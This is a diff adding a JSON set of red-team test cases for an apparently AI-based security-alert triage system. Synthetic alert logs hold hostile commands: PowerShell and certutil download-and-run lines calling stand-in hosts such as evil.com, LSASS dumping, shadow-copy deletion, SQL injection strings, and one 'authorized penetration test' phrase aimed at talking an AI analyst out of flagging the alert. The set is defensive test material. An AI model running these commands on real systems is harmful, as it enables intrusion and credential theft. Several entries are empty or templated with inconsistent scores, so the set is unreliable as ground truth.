@@ -1,0 +1,1282 @@
+[
+  {
+    "id": "RT001_TIMING_001",
+    "name": "Slowloris-style log padding",
+    "task_type": "brute_force",
+    "siem_event": {
+      "title": "Multiple Failed Logins",
+      "source_ip": "185.220.101.45",
+      "username": "admin",
+      "rule_name": "BruteForce",
+      "raw_log": "FAILED LOGIN attempt from 185.220.101.45 for user admin. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Failed password. Attempt 1 of 500."
+    },
+    "expected_detection": true,
+    "min_risk": 70
+  },
+  {
+    "id": "RT001_TIMING_002",
+    "name": "Unicode homoglyph metadata poisoning",
+    "task_type": "phishing_investigation",
+    "siem_event": {
+      "title": "Suspicious Email Detected",
+      "source_ip": "203.0.113.50",
+      "username": "user1",
+      "rule_name": "Ph\u0456shing",
+      "raw_log": "From: attacker@evil.com To: victim@company.com Subject: Urgent! Click http://evil-site.com/login"
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "RT001_TIMING_003",
+    "name": "Nested encoding attack",
+    "task_type": "c2_communication_hunt",
+    "siem_event": {
+      "title": "Beacon Detected",
+      "source_ip": "10.0.0.55",
+      "username": "svc_account",
+      "rule_name": "C2Beacon",
+      "raw_log": "Connection to Z292ZXJubWVudC1zZWN1cml0eS5jb20= every 60s. User-Agent: TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCk="
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "RT001_TIMING_004",
+    "name": "Benign metadata with attack content",
+    "task_type": "benign_system_event",
+    "siem_event": {
+      "title": "Scheduled Maintenance",
+      "source_ip": "10.0.0.1",
+      "username": "system",
+      "rule_name": "windows_update",
+      "raw_log": "Windows Update completed successfully. Also: DROP TABLE users; SELECT * FROM passwords; --"
+    },
+    "expected_detection": true,
+    "min_risk": 60
+  },
+  {
+    "id": "RT001_TIMING_005",
+    "name": "Path traversal in Windows event fields",
+    "task_type": "lateral_movement_detection",
+    "siem_event": {
+      "title": "Admin Share Access",
+      "source_ip": "192.168.1.100",
+      "username": "DOMAIN\\admin",
+      "rule_name": "LateralMovement",
+      "raw_log": "User DOMAIN\\admin accessed \\\\DC01\\ADMIN$\\..\\..\\windows\\system32\\config\\sam. PsExec.exe executed."
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "RT001_TIMING_006",
+    "name": "SQL injection in Kerberos event",
+    "task_type": "kerberoasting",
+    "siem_event": {
+      "title": "TGS Ticket Request",
+      "source_ip": "10.0.0.42",
+      "username": "svc_sql' OR '1'='1",
+      "rule_name": "Kerberoasting",
+      "raw_log": "EventID=4769 TicketEncryptionType=0x17 ServiceName=MSSQLSvc' UNION SELECT * FROM sensitive_data-- TargetUserName=svc_sql' OR '1'='1"
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "RT001_TIMING_007",
+    "name": "Zero-width character injection",
+    "task_type": "data_exfiltration_detection",
+    "siem_event": {
+      "title": "Large Data Transfer",
+      "source_ip": "10.0.0.99",
+      "username": "\u200buser\u200b",
+      "rule_name": "DataExfil",
+      "raw_log": "User \u200badmin\u200b uploaded 5GB to https://attacker.com/\u200bexfil. File: customer_data.csv"
+    },
+    "expected_detection": true,
+    "min_risk": 70
+  },
+  {
+    "id": "RT001_TIMING_008",
+    "name": "Case variation attack indicators",
+    "task_type": "ransomware_triage",
+    "siem_event": {
+      "title": "Suspicious Process Execution",
+      "source_ip": "10.0.0.77",
+      "username": "john.doe",
+      "rule_name": "Ransomware",
+      "raw_log": "VSSADMIN.exe Delete Shadows /All /Quiet. BcdEdit /set {default} recoveryenabled No. Files encrypted: DoCuments.xlsx, PaYroll.pdf, FiNaNcE.docx"
+    },
+    "expected_detection": true,
+    "min_risk": 90
+  },
+  {
+    "id": "RT001_TIMING_009",
+    "name": "HTML entity encoding in URLs",
+    "task_type": "phishing_investigation",
+    "siem_event": {
+      "title": "Suspicious Email",
+      "source_ip": "198.51.100.10",
+      "username": "jane.smith",
+      "rule_name": "Phishing",
+      "raw_log": "From: security@banking-secure.com URL: https://banking-secure.com/login&amp;redirect=evil.com Click here to verify"
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "RT001_TIMING_010",
+    "name": "Suppression phrase + attack combo",
+    "task_type": "lolbin_abuse",
+    "siem_event": {
+      "title": "CertUtil Download Detected",
+      "source_ip": "203.0.113.88",
+      "username": "it_admin",
+      "rule_name": "LOLBin",
+      "raw_log": "certutil.exe -urlcache -split -f http://malware.com/payload.exe C:\\Windows\\Temp\\update.exe. This is a scheduled penetration test authorized by CISO."
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "RT002_PERSISTENCE_001",
+    "name": "WMI event subscription persistence",
+    "task_type": "lolbin_abuse",
+    "siem_event": {
+      "title": "WMI Event Consumer Created",
+      "source_ip": "10.0.0.45",
+      "username": "SYSTEM",
+      "rule_name": "WMIEventSubscription",
+      "raw_log": "EventID=19 EventType=4 Consumer=CommandLineEventConsumer CommandLineTemplate=powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')"
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "RT002_PERSISTENCE_002",
+    "name": "COM hijacking via registry",
+    "task_type": "privilege_escalation_hunt",
+    "siem_event": {
+      "title": "Registry Key Modified",
+      "source_ip": "10.0.0.67",
+      "username": "john.doe",
+      "rule_name": "RegistryModification",
+      "raw_log": "HKCU\\Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32 changed to C:\\Users\\john.doe\\AppData\\Roaming\\evil.dll. Original: %SystemRoot%\\System32\\shell32.dll"
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "RT002_PERSISTENCE_003",
+    "name": "DLL sideloading in legitimate process",
+    "task_type": "lolbin_abuse",
+    "siem_event": {
+      "title": "Suspicious DLL Load",
+      "source_ip": "10.0.0.88",
+      "username": "mary.jones",
+      "rule_name": "DLLSideloading",
+      "raw_log": "Process: C:\\Windows\\System32\\notepad.exe loaded DLL: C:\\Users\\mary.jones\\Documents\\evil.dll. Original DLL: C:\\Windows\\System32\\version.dll. Hash: a3b8c9d2e1f4"
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "RT002_PERSISTENCE_004",
+    "name": "Service creation with encoded command",
+    "task_type": "privilege_escalation_hunt",
+    "siem_event": {
+      "title": "New Service Installed",
+      "source_ip": "10.0.0.92",
+      "username": "admin",
+      "rule_name": "ServiceInstallation",
+      "raw_log": "EventID=7045 ServiceName=UpdateService ServiceType=user mode service StartType=auto ServiceAccount=LocalSystem ImagePath=powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA=="
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "RT002_PERSISTENCE_005",
+    "name": "LSASS memory access via procdump",
+    "task_type": "kerberoasting",
+    "siem_event": {
+      "title": "Process Access LSASS",
+      "source_ip": "10.0.0.101",
+      "username": "admin",
+      "rule_name": "LSASSAccess",
+      "raw_log": "Process: procdump.exe (PID 4521) accessed lsass.exe (PID 688) with rights 0x1010. CommandLine: procdump.exe -accepteula -ma lsass.exe lsass.dmp"
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "RT002_PERSISTENCE_006",
+    "name": "BITS job for persistence",
+    "task_type": "c2_communication_hunt",
+    "siem_event": {
+      "title": "BITS Job Created",
+      "source_ip": "10.0.0.115",
+      "username": "svc_backup",
+      "rule_name": "BITSActivity",
+      "raw_log": "EventID=60 BITS job created: Name=SystemUpdate JobId={12345678-1234-1234-1234-123456789012} Owner=svc_backup Files=1 URL=http://185.220.101.77/payload.exe LocalFile=C:\\Windows\\Temp\\svchost.exe"
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "RT002_PERSISTENCE_007",
+    "name": "Scheduled task with hidden attribute",
+    "task_type": "lolbin_abuse",
+    "siem_event": {
+      "title": "Scheduled Task Created",
+      "source_ip": "10.0.0.123",
+      "username": "admin",
+      "rule_name": "ScheduledTask",
+      "raw_log": "EventID=4698 TaskName=\\Microsoft\\Windows\\Maintenance\\SystemUpdate TaskContent=<?xml version=\"1.0\"?><Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')</Arguments></Exec></Actions></Task>"
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "RT002_PERSISTENCE_008",
+    "name": "Token impersonation via RunAs",
+    "task_type": "privilege_escalation_hunt",
+    "siem_event": {
+      "title": "Process Created with Different Token",
+      "source_ip": "10.0.0.134",
+      "username": "limited.user",
+      "rule_name": "TokenImpersonation",
+      "raw_log": "EventID=4688 Process: runas.exe CommandLine: runas /savecred /user:DOMAIN\\admin \"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=\""
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "RT002_PERSISTENCE_009",
+    "name": "AppCert DLLs for persistence",
+    "task_type": "privilege_escalation_hunt",
+    "siem_event": {
+      "title": "Registry Key Modified",
+      "source_ip": "10.0.0.142",
+      "username": "admin",
+      "rule_name": "RegistryModification",
+      "raw_log": "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\\Default changed to C:\\Windows\\ evil.dll. Any process loading WinAPI CreateProcess/CreateProcessAsUser will load this DLL."
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "RT002_PERSISTENCE_010",
+    "name": "Netsh helper DLL persistence",
+    "task_type": "lolbin_abuse",
+    "siem_event": {
+      "title": "Netsh Helper DLL Registered",
+      "source_ip": "10.0.0.155",
+      "username": "admin",
+      "rule_name": "NetshHelper",
+      "raw_log": "Process: netsh.exe CommandLine: netsh add helper C:\\Users\\public\\documents\\helper.dll. EventID=4688. The DLL will be loaded every time netsh.exe executes."
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "CVE-2024-001",
+    "name": "Windows Installer Elevation",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "PERSIST-001",
+    "name": "Time Provider DLL Hijacking",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "LATERAL-001",
+    "name": "WMI Event Subscription Remote",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "DEFENSE-001",
+    "name": "Tamper Windows Defender",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "CRED-001",
+    "name": "LSASS Memory Dump via comsvcs",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "BYPASS-001",
+    "name": "AMSI Bypass via Reflection",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1055-001",
+    "name": "Process Injection via CreateRemoteThread",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1059-001",
+    "name": "PowerShell Empire Agent",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1071-001",
+    "name": "DNS Tunneling Data Exfil",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1496-001",
+    "name": "Cryptojacking via XMRig",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1567-001",
+    "name": "Exfiltration to Mega.nz",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1003-002",
+    "name": "SAM Database Dump via Reg.exe",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1548-001",
+    "name": "Bypass UAC via Event Viewer",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1036-001",
+    "name": "Masquerading as Legitimate Process",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1021-002",
+    "name": "SMB/Windows Admin Shares",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1218-001",
+    "name": "Signed Binary Proxy Execution - CMSTP",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1105-001",
+    "name": "Ingress Tool Transfer via CertUtil",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1053-005",
+    "name": "Scheduled Task/Job - At",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1087-001",
+    "name": "Account Discovery - Local Accounts",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1486-001",
+    "name": "Data Encrypted for Impact",
+    "task_type": "brute_force",
+    "siem_event": {},
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "SIM-041",
+    "name": "Simulated Brute Force",
+    "task_type": "brute_force",
+    "siem_event": {
+      "raw_log": "Failed login attempts from 10.0.207.96 - 500 attempts in 60 seconds",
+      "source_ip": "10.0.207.96",
+      "destination_ip": "",
+      "username": "user80",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "SIM-042",
+    "name": "Simulated Lateral Movement",
+    "task_type": "lateral_movement",
+    "siem_event": {
+      "raw_log": "PsExec execution from 10.0.80.161 to 10.0.53.50 with admin credentials",
+      "source_ip": "10.0.80.161",
+      "destination_ip": "10.0.53.50",
+      "username": "user4",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 77
+  },
+  {
+    "id": "SIM-043",
+    "name": "Simulated Privilege Escalation",
+    "task_type": "privilege_escalation",
+    "siem_event": {
+      "raw_log": "UAC bypass attempt via fodhelper.exe from 10.0.6.43",
+      "source_ip": "10.0.6.43",
+      "destination_ip": "",
+      "username": "user29",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 53
+  },
+  {
+    "id": "SIM-044",
+    "name": "Simulated Defense Evasion",
+    "task_type": "defense_evasion",
+    "siem_event": {
+      "raw_log": "AMSI bypass pattern detected in PowerShell from 10.0.22.104",
+      "source_ip": "10.0.22.104",
+      "destination_ip": "",
+      "username": "user52",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 62
+  },
+  {
+    "id": "SIM-045",
+    "name": "Simulated Persistence",
+    "task_type": "persistence",
+    "siem_event": {
+      "raw_log": "New service created: WindowsUpdateSvc pointing to C:\\temp\\payload.exe",
+      "source_ip": "10.0.85.170",
+      "destination_ip": "",
+      "username": "user43",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 67
+  },
+  {
+    "id": "SIM-046",
+    "name": "Simulated C2",
+    "task_type": "c2",
+    "siem_event": {
+      "raw_log": "Regular beacon detected from 10.0.249.148 to 192.168.1.100:4444 interval=60s",
+      "source_ip": "10.0.249.148",
+      "destination_ip": "10.0.27.230",
+      "username": "user46",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 84
+  },
+  {
+    "id": "SIM-047",
+    "name": "Simulated Data Exfil",
+    "task_type": "data_exfil",
+    "siem_event": {
+      "raw_log": "Large data transfer: 2GB uploaded to dropbox.com from 10.0.64.22",
+      "source_ip": "10.0.64.22",
+      "destination_ip": "",
+      "username": "user38",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "SIM-048",
+    "name": "Simulated Ransomware",
+    "task_type": "ransomware",
+    "siem_event": {
+      "raw_log": "vssadmin delete shadows /all /quiet executed on 10.0.173.117",
+      "source_ip": "10.0.173.117",
+      "destination_ip": "",
+      "username": "user6",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 94
+  },
+  {
+    "id": "SIM-049",
+    "name": "Simulated Credential Access",
+    "task_type": "credential_access",
+    "siem_event": {
+      "raw_log": "LSASS memory access from 10.0.80.212 using procdump.exe",
+      "source_ip": "10.0.80.212",
+      "destination_ip": "",
+      "username": "user13",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 56
+  },
+  {
+    "id": "SIM-050",
+    "name": "Simulated Discovery",
+    "task_type": "discovery",
+    "siem_event": {
+      "raw_log": "Suspicious activity detected from 10.0.43.53",
+      "source_ip": "10.0.43.53",
+      "destination_ip": "",
+      "username": "user89",
+      "severity": "medium"
+    },
+    "expected_detection": true,
+    "min_risk": 92
+  },
+  {
+    "id": "SIM-051",
+    "name": "Simulated Brute Force",
+    "task_type": "brute_force",
+    "siem_event": {
+      "raw_log": "Failed login attempts from 10.0.254.235 - 500 attempts in 60 seconds",
+      "source_ip": "10.0.254.235",
+      "destination_ip": "",
+      "username": "user11",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 95
+  },
+  {
+    "id": "SIM-052",
+    "name": "Simulated Lateral Movement",
+    "task_type": "lateral_movement",
+    "siem_event": {
+      "raw_log": "PsExec execution from 10.0.46.87 to 10.0.115.229 with admin credentials",
+      "source_ip": "10.0.46.87",
+      "destination_ip": "10.0.115.229",
+      "username": "user23",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 72
+  },
+  {
+    "id": "SIM-053",
+    "name": "Simulated Privilege Escalation",
+    "task_type": "privilege_escalation",
+    "siem_event": {
+      "raw_log": "UAC bypass attempt via fodhelper.exe from 10.0.197.53",
+      "source_ip": "10.0.197.53",
+      "destination_ip": "",
+      "username": "user23",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 82
+  },
+  {
+    "id": "SIM-054",
+    "name": "Simulated Defense Evasion",
+    "task_type": "defense_evasion",
+    "siem_event": {
+      "raw_log": "AMSI bypass pattern detected in PowerShell from 10.0.76.200",
+      "source_ip": "10.0.76.200",
+      "destination_ip": "",
+      "username": "user52",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 67
+  },
+  {
+    "id": "SIM-055",
+    "name": "Simulated Persistence",
+    "task_type": "persistence",
+    "siem_event": {
+      "raw_log": "New service created: WindowsUpdateSvc pointing to C:\\temp\\payload.exe",
+      "source_ip": "10.0.123.118",
+      "destination_ip": "",
+      "username": "user66",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 65
+  },
+  {
+    "id": "SIM-056",
+    "name": "Simulated C2",
+    "task_type": "c2",
+    "siem_event": {
+      "raw_log": "Regular beacon detected from 10.0.247.227 to 192.168.1.100:4444 interval=60s",
+      "source_ip": "10.0.247.227",
+      "destination_ip": "10.0.221.237",
+      "username": "user46",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "SIM-057",
+    "name": "Simulated Data Exfil",
+    "task_type": "data_exfil",
+    "siem_event": {
+      "raw_log": "Large data transfer: 2GB uploaded to dropbox.com from 10.0.113.53",
+      "source_ip": "10.0.113.53",
+      "destination_ip": "",
+      "username": "user45",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 93
+  },
+  {
+    "id": "SIM-058",
+    "name": "Simulated Ransomware",
+    "task_type": "ransomware",
+    "siem_event": {
+      "raw_log": "vssadmin delete shadows /all /quiet executed on 10.0.133.41",
+      "source_ip": "10.0.133.41",
+      "destination_ip": "",
+      "username": "user84",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 93
+  },
+  {
+    "id": "SIM-059",
+    "name": "Simulated Credential Access",
+    "task_type": "credential_access",
+    "siem_event": {
+      "raw_log": "LSASS memory access from 10.0.222.20 using procdump.exe",
+      "source_ip": "10.0.222.20",
+      "destination_ip": "",
+      "username": "user8",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 71
+  },
+  {
+    "id": "SIM-060",
+    "name": "Simulated Discovery",
+    "task_type": "discovery",
+    "siem_event": {
+      "raw_log": "Suspicious activity detected from 10.0.70.91",
+      "source_ip": "10.0.70.91",
+      "destination_ip": "",
+      "username": "user20",
+      "severity": "medium"
+    },
+    "expected_detection": true,
+    "min_risk": 86
+  },
+  {
+    "id": "SIM-061",
+    "name": "Simulated Brute Force",
+    "task_type": "brute_force",
+    "siem_event": {
+      "raw_log": "Failed login attempts from 10.0.224.56 - 500 attempts in 60 seconds",
+      "source_ip": "10.0.224.56",
+      "destination_ip": "",
+      "username": "user82",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 84
+  },
+  {
+    "id": "SIM-062",
+    "name": "Simulated Lateral Movement",
+    "task_type": "lateral_movement",
+    "siem_event": {
+      "raw_log": "PsExec execution from 10.0.127.103 to 10.0.16.65 with admin credentials",
+      "source_ip": "10.0.127.103",
+      "destination_ip": "10.0.16.65",
+      "username": "user44",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 52
+  },
+  {
+    "id": "SIM-063",
+    "name": "Simulated Privilege Escalation",
+    "task_type": "privilege_escalation",
+    "siem_event": {
+      "raw_log": "UAC bypass attempt via fodhelper.exe from 10.0.116.178",
+      "source_ip": "10.0.116.178",
+      "destination_ip": "",
+      "username": "user95",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 67
+  },
+  {
+    "id": "SIM-064",
+    "name": "Simulated Defense Evasion",
+    "task_type": "defense_evasion",
+    "siem_event": {
+      "raw_log": "AMSI bypass pattern detected in PowerShell from 10.0.51.63",
+      "source_ip": "10.0.51.63",
+      "destination_ip": "",
+      "username": "user98",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "SIM-065",
+    "name": "Simulated Persistence",
+    "task_type": "persistence",
+    "siem_event": {
+      "raw_log": "New service created: WindowsUpdateSvc pointing to C:\\temp\\payload.exe",
+      "source_ip": "10.0.40.183",
+      "destination_ip": "",
+      "username": "user95",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "SIM-066",
+    "name": "Simulated C2",
+    "task_type": "c2",
+    "siem_event": {
+      "raw_log": "Regular beacon detected from 10.0.2.182 to 192.168.1.100:4444 interval=60s",
+      "source_ip": "10.0.2.182",
+      "destination_ip": "10.0.180.240",
+      "username": "user38",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 58
+  },
+  {
+    "id": "SIM-067",
+    "name": "Simulated Data Exfil",
+    "task_type": "data_exfil",
+    "siem_event": {
+      "raw_log": "Large data transfer: 2GB uploaded to dropbox.com from 10.0.75.23",
+      "source_ip": "10.0.75.23",
+      "destination_ip": "",
+      "username": "user43",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 74
+  },
+  {
+    "id": "SIM-068",
+    "name": "Simulated Ransomware",
+    "task_type": "ransomware",
+    "siem_event": {
+      "raw_log": "vssadmin delete shadows /all /quiet executed on 10.0.58.170",
+      "source_ip": "10.0.58.170",
+      "destination_ip": "",
+      "username": "user17",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 55
+  },
+  {
+    "id": "SIM-069",
+    "name": "Simulated Credential Access",
+    "task_type": "credential_access",
+    "siem_event": {
+      "raw_log": "LSASS memory access from 10.0.70.158 using procdump.exe",
+      "source_ip": "10.0.70.158",
+      "destination_ip": "",
+      "username": "user79",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 72
+  },
+  {
+    "id": "SIM-070",
+    "name": "Simulated Discovery",
+    "task_type": "discovery",
+    "siem_event": {
+      "raw_log": "Suspicious activity detected from 10.0.168.138",
+      "source_ip": "10.0.168.138",
+      "destination_ip": "",
+      "username": "user77",
+      "severity": "medium"
+    },
+    "expected_detection": true,
+    "min_risk": 72
+  },
+  {
+    "id": "SIM-071",
+    "name": "Simulated Brute Force",
+    "task_type": "brute_force",
+    "siem_event": {
+      "raw_log": "Failed login attempts from 10.0.139.218 - 500 attempts in 60 seconds",
+      "source_ip": "10.0.139.218",
+      "destination_ip": "",
+      "username": "user57",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 58
+  },
+  {
+    "id": "SIM-072",
+    "name": "Simulated Lateral Movement",
+    "task_type": "lateral_movement",
+    "siem_event": {
+      "raw_log": "PsExec execution from 10.0.94.78 to 10.0.22.155 with admin credentials",
+      "source_ip": "10.0.94.78",
+      "destination_ip": "10.0.22.155",
+      "username": "user73",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "SIM-073",
+    "name": "Simulated Privilege Escalation",
+    "task_type": "privilege_escalation",
+    "siem_event": {
+      "raw_log": "UAC bypass attempt via fodhelper.exe from 10.0.130.100",
+      "source_ip": "10.0.130.100",
+      "destination_ip": "",
+      "username": "user83",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 84
+  },
+  {
+    "id": "SIM-074",
+    "name": "Simulated Defense Evasion",
+    "task_type": "defense_evasion",
+    "siem_event": {
+      "raw_log": "AMSI bypass pattern detected in PowerShell from 10.0.178.71",
+      "source_ip": "10.0.178.71",
+      "destination_ip": "",
+      "username": "user10",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 87
+  },
+  {
+    "id": "SIM-075",
+    "name": "Simulated Persistence",
+    "task_type": "persistence",
+    "siem_event": {
+      "raw_log": "New service created: WindowsUpdateSvc pointing to C:\\temp\\payload.exe",
+      "source_ip": "10.0.126.88",
+      "destination_ip": "",
+      "username": "user27",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 62
+  },
+  {
+    "id": "SIM-076",
+    "name": "Simulated C2",
+    "task_type": "c2",
+    "siem_event": {
+      "raw_log": "Regular beacon detected from 10.0.195.218 to 192.168.1.100:4444 interval=60s",
+      "source_ip": "10.0.195.218",
+      "destination_ip": "10.0.158.139",
+      "username": "user56",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 77
+  },
+  {
+    "id": "SIM-077",
+    "name": "Simulated Data Exfil",
+    "task_type": "data_exfil",
+    "siem_event": {
+      "raw_log": "Large data transfer: 2GB uploaded to dropbox.com from 10.0.211.111",
+      "source_ip": "10.0.211.111",
+      "destination_ip": "",
+      "username": "user6",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 71
+  },
+  {
+    "id": "SIM-078",
+    "name": "Simulated Ransomware",
+    "task_type": "ransomware",
+    "siem_event": {
+      "raw_log": "vssadmin delete shadows /all /quiet executed on 10.0.162.114",
+      "source_ip": "10.0.162.114",
+      "destination_ip": "",
+      "username": "user92",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 67
+  },
+  {
+    "id": "SIM-079",
+    "name": "Simulated Credential Access",
+    "task_type": "credential_access",
+    "siem_event": {
+      "raw_log": "LSASS memory access from 10.0.238.60 using procdump.exe",
+      "source_ip": "10.0.238.60",
+      "destination_ip": "",
+      "username": "user6",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 71
+  },
+  {
+    "id": "SIM-080",
+    "name": "Simulated Discovery",
+    "task_type": "discovery",
+    "siem_event": {
+      "raw_log": "Suspicious activity detected from 10.0.91.162",
+      "source_ip": "10.0.91.162",
+      "destination_ip": "",
+      "username": "user60",
+      "severity": "medium"
+    },
+    "expected_detection": true,
+    "min_risk": 93
+  },
+  {
+    "id": "SIM-081",
+    "name": "Simulated Brute Force",
+    "task_type": "brute_force",
+    "siem_event": {
+      "raw_log": "Failed login attempts from 10.0.230.240 - 500 attempts in 60 seconds",
+      "source_ip": "10.0.230.240",
+      "destination_ip": "",
+      "username": "user20",
+      "severity": "high"
+    },
+    "expected_detection": true,
+    "min_risk": 74
+  },
+  {
+    "id": "SIM-082",
+    "name": "Simulated Lateral Movement",
+    "task_type": "lateral_movement",
+    "siem_event": {
+      "raw_log": "PsExec execution from 10.0.9.198 to 10.0.87.146 with admin credentials",
+      "source_ip": "10.0.9.198",
+      "destination_ip": "10.0.87.146",
+      "username": "user95",
+      "severity": "critical"
+    },
+    "expected_detection": true,
+    "min_risk": 71
+  },
+  {
+    "id": "SIM-083",
+    "name": "Simulated Privilege Escalation",
+    "task_type": "privilege_escalation",
+    "siem_event": {
